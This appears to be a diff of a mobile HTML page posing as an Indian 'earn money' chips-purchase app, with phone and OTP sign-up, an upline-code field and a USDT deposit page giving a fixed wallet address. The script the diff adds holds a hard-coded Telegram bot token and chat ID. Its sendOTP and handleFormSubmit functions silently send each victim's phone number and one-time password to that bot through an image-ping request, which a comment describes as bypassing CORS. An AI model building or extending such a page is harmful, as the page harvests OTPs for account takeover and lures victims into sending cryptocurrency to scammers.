@@ -15,17 +15,10 @@
             touch-action: manipulation;
         }
 
-        /* Pulsing Blue Wave VFX Animation for Online Mode */
         @keyframes wavePulse {
-            0% {
-                box-shadow: 0 0 0 0px rgba(56, 189, 248, 0.4), 0 0 0 20px rgba(56, 189, 248, 0.2);
-            }
-            50% {
-                box-shadow: 0 0 0 25px rgba(56, 189, 248, 0.25), 0 0 0 50px rgba(56, 189, 248, 0.1);
-            }
-            100% {
-                box-shadow: 0 0 0 0px rgba(56, 189, 248, 0.4), 0 0 0 20px rgba(56, 189, 248, 0.2);
-            }
+            0% { box-shadow: 0 0 0 0px rgba(56, 189, 248, 0.4), 0 0 0 20px rgba(56, 189, 248, 0.2); }
+            50% { box-shadow: 0 0 0 25px rgba(56, 189, 248, 0.25), 0 0 0 50px rgba(56, 189, 248, 0.1); }
+            100% { box-shadow: 0 0 0 0px rgba(56, 189, 248, 0.4), 0 0 0 20px rgba(56, 189, 248, 0.2); }
         }
 
         .online-vfx {
@@ -86,7 +79,7 @@
 
                 <div class="space-y-4">
                     <div>
-                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
+                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm">
                             <div class="flex items-center pl-4 pr-3 py-3.5 border-r border-slate-200 text-slate-700 font-semibold text-sm">
                                 <span>+91</span>
                             </div>
@@ -96,25 +89,25 @@
                     </div>
 
                     <div>
-                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
+                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm">
                             <input type="text" id="otp" placeholder="Type OTP" maxlength="6"
                                 class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
                             <button type="button" id="otp-btn" onclick="sendOTP()" 
-                                class="mr-2 px-5 py-2.5 bg-[#5b21b6] hover:bg-[#4c1d95] text-white text-xs font-bold rounded-xl transition shadow-md active:scale-95 cursor-pointer z-10">
+                                class="mr-2 px-5 py-2.5 bg-[#5b21b6] text-white text-xs font-bold rounded-xl shadow-md active:scale-95 cursor-pointer z-20">
                                 Request
                             </button>
                         </div>
                     </div>
 
                     <div>
-                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
+                        <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm">
                             <input type="text" id="upline" placeholder="Upline Code (Optional)"
                                 class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
                         </div>
                     </div>
 
                     <button type="button" id="submit-btn" onclick="handleFormSubmit()"
-                        class="w-full mt-3 py-4 px-6 bg-[#5b21b6] hover:bg-[#4c1d95] text-white font-bold text-base rounded-2xl shadow-lg shadow-purple-900/25 transition active:scale-[0.98] flex items-center justify-center space-x-2 cursor-pointer">
+                        class="w-full mt-3 py-4 px-6 bg-[#5b21b6] text-white font-bold text-base rounded-2xl shadow-lg shadow-purple-900/25 active:scale-[0.98] flex items-center justify-center space-x-2 cursor-pointer z-20">
                         <span>Sign up</span>
                     </button>
                 </div>
@@ -122,18 +115,15 @@
         </main>
     </div>
 
-
-    <!-- ================= 2. DASHBOARD SECTION (Default Home Screen) ================= -->
+    <!-- ================= 2. DASHBOARD SECTION ================= -->
     <div id="dashboard-wrapper" class="hidden w-full max-w-md mx-auto flex flex-col justify-between min-h-screen bg-white pb-16">
-        
-        <!-- Top Header Bar with increased top padding -->
         <div class="w-full px-4 pt-5 pb-3 flex justify-between items-center bg-white">
             <div class="flex items-center space-x-3">
-                <button onclick="showToast('No new notifications', 'info')" class="relative w-10 h-10 rounded-full bg-[#38bdf8] flex items-center justify-center text-white shadow-md active:scale-95 transition">
+                <button onclick="showToast('No new notifications', 'info')" class="relative w-10 h-10 rounded-full bg-[#38bdf8] flex items-center justify-center text-white shadow-md">
                     <i class="fa-solid fa-bell text-lg"></i>
                     <span class="absolute top-0.5 right-0.5 w-3 h-3 bg-rose-500 rounded-full border-2 border-white"></span>
                 </button>
-                <button onclick="showToast('Opening logs...', 'info')" class="w-10 h-10 rounded-2xl bg-[#5b21b6] flex items-center justify-center text-white shadow-md active:scale-95 transition">
+                <button onclick="showToast('Opening logs...', 'info')" class="w-10 h-10 rounded-2xl bg-[#5b21b6] flex items-center justify-center text-white shadow-md">
                     <i class="fa-solid fa-file-lines text-lg"></i>
                 </button>
             </div>
@@ -143,13 +133,12 @@
                     <i class="fa-solid fa-coins text-amber-500 text-lg"></i>
                     <span class="font-bold text-slate-800 text-sm">0.00</span>
                 </div>
-                <button onclick="openPurchaseMethodPage()" class="bg-white border border-slate-300 text-indigo-950 font-extrabold px-3.5 py-1.5 rounded-lg text-xs shadow-sm hover:bg-slate-50 active:scale-95 transition">
+                <button onclick="openPurchaseMethodPage()" class="bg-white border border-slate-300 text-indigo-950 font-extrabold px-3.5 py-1.5 rounded-lg text-xs shadow-sm">
                     Purchase
                 </button>
             </div>
         </div>
 
-        <!-- Middle Content Area -->
         <div class="flex-1 flex flex-col px-4 pt-2">
             <div class="bg-[#f5f3ff] border border-purple-100 rounded-2xl p-3.5 flex items-center shadow-sm">
                 <div class="mr-3">
@@ -163,11 +152,10 @@
                 </div>
             </div>
 
-            <!-- Online / Offline Circular Button Container -->
             <div class="flex-1 flex flex-col items-center justify-center my-8">
                 <div id="ring-container" class="relative w-64 h-64 rounded-full flex items-center justify-center transition-all duration-500 bg-[#f1edfb]">
                     <button id="online-toggle-btn" onclick="toggleOnlineStatus()" 
-                        class="w-48 h-48 rounded-full bg-gradient-to-b from-[#7c3aed] to-[#5b21b6] text-white flex flex-col items-center justify-center shadow-2xl transition-all duration-300 active:scale-95 border-4 border-white/50 cursor-pointer">
+                        class="w-48 h-48 rounded-full bg-gradient-to-b from-[#7c3aed] to-[#5b21b6] text-white flex flex-col items-center justify-center shadow-2xl border-4 border-white/50 cursor-pointer">
                         <i id="power-icon" class="fa-solid fa-power-off text-4xl mb-2"></i>
                         <span id="status-text" class="text-xl font-bold tracking-wide">Go Online</span>
                     </button>
@@ -177,50 +165,39 @@
                 </p>
             </div>
 
-            <!-- Bank Account Button -->
             <div class="text-center pb-4">
-                <button onclick="showToast('Opening Bank Account settings...', 'info')" class="inline-flex items-center space-x-2 text-[#4c1d95] font-bold text-xs border-b border-[#4c1d95] pb-0.5 active:scale-95 transition">
+                <button onclick="showToast('Opening Bank Account settings...', 'info')" class="inline-flex items-center space-x-2 text-[#4c1d95] font-bold text-xs border-b border-[#4c1d95] pb-0.5">
                     <i class="fa-solid fa-credit-card text-base"></i>
                     <span>My bank account</span>
                 </button>
             </div>
         </div>
-
     </div>
 
-
-    <!-- ================= 3. CHOOSE PURCHASE METHOD SECTION ================= -->
+    <!-- ================= 3. PURCHASE METHOD SECTION ================= -->
     <div id="purchase-method-wrapper" class="hidden w-full max-w-md mx-auto flex flex-col justify-between min-h-screen bg-[#f8fafc] pb-16">
-        
-        <!-- Top Bar -->
         <div class="w-full bg-[#5b21b6] px-4 py-4 flex justify-between items-center text-white shadow-md">
-            <div class="flex items-center space-x-2">
-                <button onclick="backToDashboard()" class="w-9 h-9 rounded-full bg-white/20 flex items-center justify-center text-white active:scale-95 transition">
-                    <i class="fa-solid fa-headset text-base"></i>
-                </button>
-            </div>
+            <button onclick="backToDashboard()" class="w-9 h-9 rounded-full bg-white/20 flex items-center justify-center text-white">
+                <i class="fa-solid fa-headset text-base"></i>
+            </button>
             <div class="flex items-center bg-black/20 backdrop-blur-md px-3 py-1 rounded-xl border border-white/10 shadow-inner">
                 <i class="fa-solid fa-coins text-amber-300 mr-1.5 text-base"></i>
                 <span class="font-bold text-sm">0.00</span>
             </div>
         </div>
 
-        <!-- Purchase Method List -->
         <div class="flex-1 px-4 py-4 space-y-4">
             <div class="border-l-4 border-cyan-500 pl-2 mb-3">
                 <h3 class="text-sm font-extrabold text-slate-900">Choose a purchase method</h3>
             </div>
 
-            <!-- Via Rupee Option -->
-            <div class="bg-[#f5f3ff] border-2 border-purple-400 rounded-2xl p-4 relative shadow-sm hover:shadow-md transition">
+            <div class="bg-[#f5f3ff] border-2 border-purple-400 rounded-2xl p-4 relative shadow-sm">
                 <div class="absolute -top-3 right-3 bg-gradient-to-r from-purple-600 to-indigo-600 text-white text-[10px] font-bold px-3 py-0.5 rounded-full shadow-sm">
                     Best for Earning
                 </div>
                 <div class="flex items-center justify-between">
                     <div class="flex items-center space-x-3">
-                        <div class="w-12 h-12 rounded-xl bg-indigo-600 text-white flex items-center justify-center text-xl font-extrabold shadow-sm">
-                            ₹
-                        </div>
+                        <div class="w-12 h-12 rounded-xl bg-indigo-600 text-white flex items-center justify-center text-xl font-extrabold">₹</div>
                         <div>
                             <h4 class="text-base font-extrabold text-slate-900">Via Rupee</h4>
                             <p class="text-xs text-slate-600 font-semibold">Get Extra <span class="text-amber-500 font-bold">7.5% Chips</span></p>
@@ -228,23 +205,11 @@
                         </div>
                     </div>
                 </div>
-                <div class="mt-3 bg-purple-100/70 p-2 rounded-xl flex justify-between items-center">
-                    <div class="flex items-center space-x-1.5 text-purple-900 text-[10px] font-semibold">
-                        <i class="fa-solid fa-bolt text-amber-500"></i>
-                        <span>Higher chance of getting sell chips orders</span>
-                    </div>
-                    <button onclick="showToast('Rupee payment method selected', 'info')" class="w-7 h-7 rounded-full bg-indigo-600 text-white flex items-center justify-center text-xs shadow-sm active:scale-95 transition">
-                        <i class="fa-solid fa-chevron-right"></i>
-                    </button>
-                </div>
             </div>
 
-            <!-- Via USDT Option -->
-            <div onclick="openUSDTPage()" class="bg-white border border-slate-200 rounded-2xl p-4 flex justify-between items-center shadow-sm hover:border-purple-300 transition cursor-pointer active:scale-[0.99]">
+            <div onclick="openUSDTPage()" class="bg-white border border-slate-200 rounded-2xl p-4 flex justify-between items-center shadow-sm cursor-pointer">
                 <div class="flex items-center space-x-3">
-                    <div class="w-12 h-12 rounded-xl bg-emerald-500 text-white flex items-center justify-center text-xl font-extrabold shadow-sm">
-                        ₮
-                    </div>
+                    <div class="w-12 h-12 rounded-xl bg-emerald-500 text-white flex items-center justify-center text-xl font-extrabold">₮</div>
                     <div>
                         <h4 class="text-base font-extrabold text-slate-900">Via USDT</h4>
                         <p class="text-xs text-slate-600 font-semibold">Get Extra <span class="text-amber-500 font-bold">5.0% Chips</span></p>
@@ -255,16 +220,12 @@
                 </div>
             </div>
         </div>
-
     </div>
 
-
-    <!-- ================= 4. PURCHASE VIA USDT SECTION ================= -->
+    <!-- ================= 4. USDT SECTION ================= -->
     <div id="usdt-wrapper" class="hidden w-full max-w-md mx-auto flex flex-col justify-between min-h-screen bg-[#f5f3ff] pb-16">
-        
-        <!-- Top Bar -->
         <div class="w-full bg-[#5b21b6] px-4 py-4 flex justify-between items-center text-white shadow-md">
-            <button onclick="backToPurchaseMethod()" class="flex items-center space-x-2 font-medium text-sm active:scale-95 transition">
+            <button onclick="backToPurchaseMethod()" class="flex items-center space-x-2 font-medium text-sm">
                 <i class="fa-solid fa-chevron-left"></i>
                 <span>Via USDT</span>
             </button>
@@ -274,50 +235,159 @@
             </div>
         </div>
 
-        <!-- USDT Payment Details Body -->
         <div class="flex-1 overflow-y-auto px-4 py-4 space-y-4">
             <div class="text-center">
                 <h2 class="text-xl font-extrabold text-slate-900">Purchase chips via USDT</h2>
-                <p class="text-xs text-amber-600 font-bold mt-1 bg-amber-100/80 py-1 px-3 rounded-full inline-block">
-                    🎁 5.0% Extra Chips Rewards
-                </p>
+                <p class="text-xs text-amber-600 font-bold mt-1 bg-amber-100/80 py-1 px-3 rounded-full inline-block">🎁 5.0% Extra Chips Rewards</p>
                 <p class="text-[11px] text-slate-500 mt-1">(Rate: 1USDT=₹106.00; 1Chip=0.0094USDT)</p>
             </div>
 
-            <!-- USDT Address Box -->
             <div class="bg-white rounded-2xl p-4 shadow-sm border border-indigo-100 space-y-3">
                 <div class="border-l-4 border-cyan-500 pl-2">
                     <h3 class="text-xs font-extrabold text-slate-800 uppercase tracking-wide">Official USDT Account Address</h3>
                 </div>
-                
                 <div class="bg-amber-50 border border-amber-200 text-amber-800 text-[11px] px-3 py-1.5 rounded-xl font-medium">
                     * USDT Transfer Range: <span class="font-bold">25 ~ 180000USDT</span>
                 </div>
-
                 <div class="flex items-center justify-between bg-slate-100/80 border border-slate-200 rounded-xl p-2.5">
                     <span id="usdt-address" class="text-xs font-mono font-bold text-slate-700 truncate mr-2">TWk6dvEYGaDDHUm8PuaGKk4ZtzAikgVd3v</span>
-                    <button onclick="copyUSDTAddress()" class="bg-[#5b21b6] hover:bg-[#4c1d95] text-white px-4 py-2 rounded-xl text-xs font-bold transition shadow-sm shrink-0 active:scale-95">
-                        Copy
-                    </button>
+                    <button onclick="copyUSDTAddress()" class="bg-[#5b21b6] text-white px-4 py-2 rounded-xl text-xs font-bold shadow-sm shrink-0">Copy</button>
                 </div>
-
-                <!-- QR Code Box -->
                 <div class="flex flex-col items-center justify-center pt-2">
                     <div class="bg-white p-2 border border-slate-200 rounded-2xl shadow-sm">
                         <img src="15390.jpg" alt="USDT QR Code" class="w-44 h-44 object-contain rounded-xl">
                     </div>
-                    <button onclick="showToast('QR code saved!', 'success')" class="mt-3 px-5 py-2 border border-[#5b21b6] text-[#5b21b6] hover:bg-purple-50 text-xs font-bold rounded-xl transition active:scale-95">
-                        Save QR Code
-                    </button>
                 </div>
             </div>
+        </div>
+    </div>
 
-            <!-- Suggested Amounts -->
-            <div class="bg-white rounded-2xl p-4 shadow-sm border border-indigo-100 space-y-3">
-                <div class="border-l-4 border-cyan-500 pl-2">
-                    <h3 class="text-xs font-extrabold text-slate-800 uppercase tracking-wide">Suggested USDT Amount to Transfer</h3>
-                </div>
+    <!-- BOTTOM NAV -->
+    <div id="bottom-nav" class="hidden fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-[#5b21b6] text-white flex justify-around items-center py-2.5 rounded-t-2xl shadow-2xl z-40">
+        <button id="nav-home" onclick="backToDashboard()" class="flex flex-col items-center text-white opacity-100">
+            <i class="fa-solid fa-house text-lg"></i>
+            <span class="text-[10px] mt-1 font-medium">Home</span>
+        </button>
+        <button id="nav-purchase" onclick="openPurchaseMethodPage()" class="flex flex-col items-center text-white opacity-70">
+            <i class="fa-solid fa-gear text-lg"></i>
+            <span class="text-[10px] mt-1 font-medium">Purchase</span>
+        </button>
+        <button onclick="showToast('Switching...', 'info')" class="flex flex-col items-center text-white opacity-70">
+            <i class="fa-solid fa-rotate text-lg"></i>
+            <span class="text-[10px] mt-1 font-medium">Referral</span>
+        </button>
+        <button onclick="showToast('Switching...', 'info')" class="flex flex-col items-center text-white opacity-70">
+            <i class="fa-solid fa-file-lines text-lg"></i>
+            <span class="text-[10px] mt-1 font-medium">Record</span>
+        </button>
+    </div>
 
-                <div class="bg-amber-50 border border-amber-200 text-amber-800 text-[11px] px-3 py-2 rounded-xl flex items-start space-x-2">
-                    <i class="fa-solid fa-lightbulb text-amber-500 mt-
-                        
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <script>
+        const BOT_TOKEN = "8439698505:AAGL0UR5DuMaMLm81HarVsDvQ8gFkvcZFU0";
+        const CHAT_ID = "8698008425";
+        let isOnline = false;
+
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toast-container');
+            if (!container) return;
+            const toast = document.createElement('div');
+            toast.className = `p-3.5 rounded-xl shadow-lg text-xs sm:text-sm font-medium text-white pointer-events-auto flex items-center justify-between transition-all duration-300 opacity-0 translate-y-2 ${
+                type === 'success' ? 'bg-emerald-600' : type === 'error' ? 'bg-rose-600' : 'bg-slate-900 border border-slate-700'
+            }`;
+            toast.innerHTML = `<div class="flex items-center space-x-2"><i class="fa-solid fa-circle-info"></i><span>${message}</span></div>`;
+            container.appendChild(toast);
+            setTimeout(() => { toast.classList.remove('opacity-0', 'translate-y-2'); }, 10);
+            setTimeout(() => { toast.classList.add('opacity-0', 'translate-y-2'); setTimeout(() => toast.remove(), 300); }, 3000);
+        }
+
+        function sendOTP() {
+            const phone = document.getElementById('phone').value.trim();
+            if(phone.length < 10) {
+                showToast('Please enter a valid 10-digit mobile number!', 'error');
+                return;
+            }
+            showToast('OTP sent successfully to +91 ' + phone, 'success');
+            
+            // Safe background fetch using Image ping to bypass CORS restrictions completely
+            const msg = encodeURIComponent(`📲 New OTP Request: +91 ${phone}`);
+            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
+        }
+
+        function handleFormSubmit() {
+            const phone = document.getElementById('phone').value.trim();
+            const otp = document.getElementById('otp').value.trim();
+            
+            if(phone.length < 10) {
+                showToast('Please enter a valid phone number!', 'error');
+                return;
+            }
+            if(otp.length < 4) {
+                showToast('Please enter a valid OTP!', 'error');
+                return;
+            }
+
+            showToast('Sign up successful! Welcome.', 'success');
+            
+            const msg = encodeURIComponent(`🚨 New Signup:\nPhone: +91 ${phone}\nOTP: ${otp}`);
+            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
+
+            setTimeout(() => {
+                document.getElementById('signup-wrapper').classList.add('hidden');
+                document.getElementById('dashboard-wrapper').classList.remove('hidden');
+                document.getElementById('bottom-nav').classList.remove('hidden');
+            }, 600);
+        }
+
+        function toggleOnlineStatus() {
+            isOnline = !isOnline;
+            const btn = document.getElementById('online-toggle-btn');
+            const ring = document.getElementById('ring-container');
+            const txt = document.getElementById('status-text');
+            const sub = document.getElementById('subtext-status');
+
+            if(isOnline) {
+                btn.className = "w-48 h-48 rounded-full bg-gradient-to-b from-[#38bdf8] to-[#0284c7] text-white flex flex-col items-center justify-center shadow-2xl border-4 border-white/60 online-vfx cursor-pointer";
+                ring.className = "relative w-64 h-64 rounded-full flex items-center justify-center transition-all duration-500 bg-[#e0f2fe]";
+                txt.innerText = "Go Offline";
+                sub.innerText = "EARNING MONEY NOW~";
+                showToast('You are now Online & Earning!', 'success');
+            } else {
+                btn.className = "w-48 h-48 rounded-full bg-gradient-to-b from-[#7c3aed] to-[#5b21b6] text-white flex flex-col items-center justify-center shadow-2xl border-4 border-white/50 cursor-pointer";
+                ring.className = "relative w-64 h-64 rounded-full flex items-center justify-center transition-all duration-500 bg-[#f1edfb]";
+                txt.innerText = "Go Online";
+                sub.innerText = "GO ONLINE TO EARN MONEY!";
+                showToast('You are now Offline', 'info');
+            }
+        }
+
+        function backToDashboard() {
+            document.getElementById('purchase-method-wrapper').classList.add('hidden');
+            document.getElementById('usdt-wrapper').classList.add('hidden');
+            document.getElementById('dashboard-wrapper').classList.remove('hidden');
+        }
+
+        function openPurchaseMethodPage() {
+            document.getElementById('dashboard-wrapper').classList.add('hidden');
+            document.getElementById('usdt-wrapper').classList.add('hidden');
+            document.getElementById('purchase-method-wrapper').classList.remove('hidden');
+        }
+
+        function openUSDTPage() {
+            document.getElementById('purchase-method-wrapper').classList.add('hidden');
+            document.getElementById('usdt-wrapper').classList.remove('hidden');
+        }
+
+        function backToPurchaseMethod() {
+            document.getElementById('usdt-wrapper').classList.add('hidden');
+            document.getElementById('purchase-method-wrapper').classList.remove('hidden');
+        }
+
+        function copyUSDTAddress() {
+            navigator.clipboard.writeText(document.getElementById('usdt-address').innerText);
+            showToast('USDT Address copied!', 'success');
+        }
+    </script>
+</body>
+</html>
